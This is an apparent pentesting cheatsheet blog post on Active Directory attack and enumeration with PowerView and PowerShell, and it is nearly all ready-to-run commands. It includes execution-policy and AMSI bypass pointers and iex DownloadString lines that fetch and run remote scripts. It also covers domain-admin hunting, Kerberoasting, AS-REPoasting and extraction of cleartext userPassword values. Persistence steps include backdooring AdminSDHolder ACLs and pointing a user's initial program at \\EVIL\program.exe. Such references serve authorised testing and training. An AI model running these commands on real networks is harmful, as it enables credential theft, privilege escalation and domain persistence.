---
layout: post
title: TA0007 Discovery - AD Enumeration with Powershell
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2021-11-17
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* [PRE-REQUISITE: Installing PowerView](#PRE-REQUISITE:InstallingPowerView)
* [PRE-REQUISITE: AD Web Services on the DC](#PRE-REQUISITE:ADWebServicesontheDC)
* [T1087.002 Account Discovery - Domain Account](#T1087.002AccountDiscovery-DomainAccount)
	* [Domain Admin Account](#DomainAdminAccount)
	* [Other Privileged Users](#OtherPrivilegedUsers)
* [T1615 Group Policy Discovery](#T1615GroupPolicyDiscovery)
* [T1615 Network Shares](#T1615NetworkShares)
* [T1615 ACL](#T1615ACL)
	* [CHANGE PASSWORD](#CHANGEPASSWORD)
	* [DCSYNC](#DCSYNC)
* [ENUM: DOMAIN](#ENUM:DOMAIN)
* [ENUM: DOMAIN PERSISTENCY](#ENUM:DOMAINPERSISTENCY)
* [ENUM: FOREST PRIVESC](#ENUM:FORESTPRIVESC)
* [T1046 SERVICES LOOTS](#T1046SERVICESLOOTS)
* [ENUM: Kerberoasting](#ENUM:Kerberoasting)
* [MISC](#MISC)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='PRE-REQUISITE:InstallingPowerView'></a>PRE-REQUISITE: Installing PowerView

- [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
# Bypass AMSI 
- [amsi.fails]('https://amsi.fails')
- [S3cur3Th1sSh1t]('https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell')
- [notes.offsec-journey.com]('https://notes.offsec-journey.com/evasion/amsi-bypass')

```powershell
# Bypass powershell execution protection
powershell -ep bypass


# ActiveDirectory Module v1
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# ActiveDirectory Module v2
$webreq = [System.Net.WebRequest]::Create(‘https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
IEX($content)

# PowerView Module
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');New-InMemoryModule
```
## <a name='PRE-REQUISITE:ADWebServicesontheDC'></a>PRE-REQUISITE: AD Web Services on the DC

On the error below when loading the AD module, ADWS must be reachable and running:
- TCP port 9389 reachable from your endpoint (and listening on the DC) : ```Test-NetConnection DC01 -port 9389```
- Restart the service on the DC : ```Restart-Service –name ADWS –verbose```

```
PS > iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

AVERTISSEMENT : Error initializing default drive: 'Unable to find a default server with Active Directory Web Services running.'.
```
For more info, read the article from [theitbros.om](https://theitbros.com/unable-to-find-a-default-server-with-active-directory-web-services-running/).

## <a name='T1087.002AccountDiscovery-DomainAccount'></a>T1087.002 Account Discovery - Domain Account
### <a name='DomainAdminAccount'></a>Domain Admin Account
```powershell
# PowerView: find where DA has logged on / and current user has access
Invoke-UserHunter
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -CheckAccess | select username, computername, IPAddress

# get all the effective members of DA groups, 'recursing down'
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select membername, membersid
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain <Forest> | select membername, membersid

# PowerView: gather info on the DA security groups
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose| ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# find linked DA accounts using name correlation
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}

# Find admin groups based on "adm" keyword
Get-NetGroup *adm* 

```

### <a name='OtherPrivilegedUsers'></a>Other Privileged Users

- [Well-known Microsoft SID List](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)

```powershell
# look for the keyword "pass" in the description attribute for each user in the domain
Find-UserField -SearchField Description -SearchTerm "pass"

# find computers where the current user is local admin
Find-LocalAdminAccess

# find local admins on all computers of the domain
Invoke-EnumerateLocalAdmin | select computername, membername

# get all the effective members of DA groups, 'recursing down'
Get-DomainGroupMember -Identity "Domain Computers" -Recurse | select membername, membersid

# Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName <Server>.<FQDN>

# gather info on security groups
Get-ObjectAcl -SamAccountName "Domain Computers" -ResolveGUIDs -Verbose | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
Get-DomainGroupMember -Identity "Backup Operators" -Recurse
Get-NetGroupMember -GroupName RDPUsers
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} 

# get actively logged users on a computer
Get-NetLoggedon -ComputerName <Computer>

# find where a user has logged on
Invoke-UserHunter -UserIdentity <User>

# get last logged users on a computer
Get-LastLoggedon -ComputerName <Computer>

# testing accounts with empty passwords 
$mycreds = New-Object System.Management.Automation.PSCredential("<sogreat>", (new-object System.Security.SecureString))
Invoke-Command -Credential $mycreds -ComputerName <Computer> -ScriptBlock {whoami; hostname}

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity *server* -Domain <Domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}

# return the local *groups* of a remote server
Get-NetLocalGroup <Server>.<FQDN>
```

## <a name='T1615GroupPolicyDiscovery'></a>T1615 Group Policy Discovery
```powershell
# find users who have local admin rights
Find-GPOComputerAdmin -ComputerName <Computer>
Get-NetOU Admins | %{Get-NetComputer -ADSPath $_}

# find users who have local admin rights
Find-GPOLocation -UserName <DA>

# list users that can reset password
Get-NetGPO | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -RightsFilter "ResetPassword"}

# list users and GPO he can modifiy
Get-NetGPO | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name}

# retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}

# enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -Identity <User> -Domain <Domain> -LocalGroup RDP

# export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# find all policies applied to a computer/server
Get-DomainGPO -ComputerIdentity <Server>.<FQDN>

# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```

## <a name='T1615NetworkShares'></a>T1615 Network Shares
```powershell
# find share folders in the domain
Invoke-ShareFinder

# use alternate credentials for searching for files on the domain
#   Find-InterestingDomainShareFile == old Invoke-FileFinder
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("<Domain>\user",$Password)
Find-InterestingDomainShareFile -Domain <Domain> -Credential $Credential

```

## <a name='T1615ACL'></a>T1615 ACL
```powershell
# list users/groups ACLs
# valuable attributes: IdentityReference, ObjectDN, ActiveDirectoryRights
Get-ObjectAcl -SamAccountName <User>-ResolveGUIDs

```

### <a name='CHANGEPASSWORD'></a>CHANGE PASSWORD
```powershell
# grant user 'will' the rights to change 'matt's password
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```

### <a name='DCSYNC'></a>DCSYNC
```powershell
# AllExtendedRights privilege grants both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges

# retrieve *most* users who can perform DC replication for dev.<Domain>.local (i.e. DCsync)
Get-DomainObjectAcl "dc=dev,dc=<Domain>,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# retrieve *most* users who can perform DC replication for dev.<Domain>.local (i.e. DCsync)
Get-ObjectACL "DC=<Domain>,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}
```
## <a name='ENUM:DOMAIN'></a>ENUM: DOMAIN

```powershell
Get-NetDomainController

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy <DC>
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Policy Domain
$DomainPolicy.KerberosPolicy # useful for golden tickets
$DomainPolicy.SystemAccess # password age/etc.
```


## <a name='ENUM:DOMAINPERSISTENCY'></a>ENUM: DOMAIN PERSISTENCY

```powershell
# enumerate who has rights to the 'matt' user in '<Domain>.local', resolving rights GUIDs to names
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain <Domain>

# audit the permissions of AdminSDHolder, resolving GUIDs
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local' -ResolveGUIDs

# backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local' -PrincipalIdentity matt -Rights All/
```

## <a name='ENUM:FORESTPRIVESC'></a>ENUM: FOREST PRIVESC

```powershell
# get the trusts of the current domain/forest
Get-NetDomainTrust
Get-NetForestTrust

# get information about an other forest
Get-NetForest -Forest <Forest>

# find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```

## <a name='T1046SERVICESLOOTS'></a>T1046 SERVICES LOOTS

```powershell
# find all users with an SPN set (likely service accounts)
Get-DomainUser -SPN | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# find any users/computers with constrained delegation set
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, accountexpires
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, accountexpires

# enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# find all Win2008 R2 computers (likely servers) and IP/ICMP reachable
Get-NetComputer -OperatingSystem "Windows 2008*" -Ping

```

## <a name='ENUM:Kerberoasting'></a>TXXXX Credentials Dumping
```powershell
# get the domain policy settings for the passwords: history, complexicity, lockout, clear-text
(Get-DomainPolicy)."system access"

# get all users with passwords changed > 1 year ago, returning sam account names and password last set times
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset,useraccountcontrol

# get the last password set of each user in the current domain
Get-UserProperty -Properties pwdlastset
```

### <a name='ENUM:Kerberoasting'></a>Kerberoasting
```powershell
# Kerberoast any users in a particular OU with SPNs set
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=<Domain>,DC=local"
```

### <a name='ENUM:Kerberoasting'></a>AS-REPoasting
```powershell
# check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

## <a name='MISC'></a>MISC
```powershell
# get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
Get-DomainGroup -MemberIdentity <User/Group>

# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat', $SecPassword)
Get-DomainUser -Credential $Cred

# all enabled users, returning distinguishednames
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname

# all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE

# all users that require smart card authentication
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED

# all users that *don't* require smart card authentication, only returning sam account names
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

# use multiple identity types for any *-Domain* function
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dagreat,CN=Users,DC=<Domain>,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

# find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..."

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog

# turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}

# save a PowerView object to disk for later usage
Get-DomainUser | Export-Clixml user.xml
$Users = Import-Clixml user.xml

# enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name

# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://<Domain>.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl

# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf

# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

# check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```